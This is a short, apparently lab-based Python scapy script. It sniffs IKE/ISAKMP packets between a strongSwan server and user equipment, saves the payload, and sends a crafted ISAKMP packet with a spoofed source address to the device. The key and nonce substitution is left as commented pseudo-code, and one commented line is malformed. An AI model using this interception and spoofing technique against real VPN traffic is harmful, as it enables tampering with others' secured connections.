#!/usr/local/bin/python
from scapy.all import *

##### Phase 2 #####

# capturing response pk from swan server to UE
packet2=sniff(iface="vmnet8", filter="udp and port 500", count=2, prn=lambda x: x.summary)
#packet2=sniff(iface="vmnet8", filter="udp and port 500", count=2)

# storing 2nd response pk from swan server
data3 = ""
		
tlayer3 =packet2[1].getlayer("UDP")	
if packet2[1].getlayer(ISAKMP):	
   data3 += str(tlayer3.payload) #assemble the packet
f = open("raw_data3.dat", 'w')
f.write(data3)
f.close()

#Packetizing data3 + data2, psuedo code

#extracting key and nonce from data3
#new_key=packet2[1].key
#new_nonce=packet2[1].nonce

#replace it with data2
pkts=rdpcap("data2.pcap", count=1)
#wireshark(pkts)
#pkts.key = new_key
#pkts.nonce = new_nonce
#send(IP(dst=10.0.0.30")/UDP()/ISAKMP(pkts))    # UE : 10.0.0.30 

send(IP(dst="10.0.0.30", src="208.54.83.96")/UDP()/ISAKMP(data3))   # temporarily sending command




